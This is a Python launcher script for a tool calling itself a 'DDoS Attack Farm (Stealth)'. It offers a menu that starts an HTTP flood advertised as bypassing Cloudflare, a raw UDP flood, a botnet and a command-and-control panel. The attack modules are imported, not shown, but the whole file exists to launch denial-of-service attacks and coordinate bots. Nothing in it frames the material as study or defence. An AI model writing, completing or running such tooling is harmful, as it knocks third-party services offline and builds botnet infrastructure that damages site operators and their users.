
from attack_engines.http_bypass import start_http_bypass
from attack_engines.udp_overload import start_udp_flood
from controller.master_panel import start_master_panel

def banner():
    print(r"""
╔════════════════════════════════════════════╗
║ ⚔ Faizan™ DDoS Attack Farm - v2.0 (Stealth) ⚔ ║
╚════════════════════════════════════════════╝
""")

def menu():
    print("\n[1] HTTP Flood (Cloudflare Bypass with HTTPS)")
    print("[2] UDP Flood (Real Raw Packets)")
    print("[3] Launch BotNet (Auto Attack Bots)")
    print("[4] Master Control Panel (C2)")
    print("[0] Exit")
    choice = input("\n[?] Choose attack mode: ")
    if choice == "1":
        start_http_bypass()
    elif choice == "2":
        start_udp_flood()
    elif choice == "3":
        from controller.botnet_engine import launch_botnet
        launch_botnet()
    elif choice == "4":
        start_master_panel()
    else:
        print("[-] Exiting...")

if __name__ == "__main__":
    banner()
    menu()
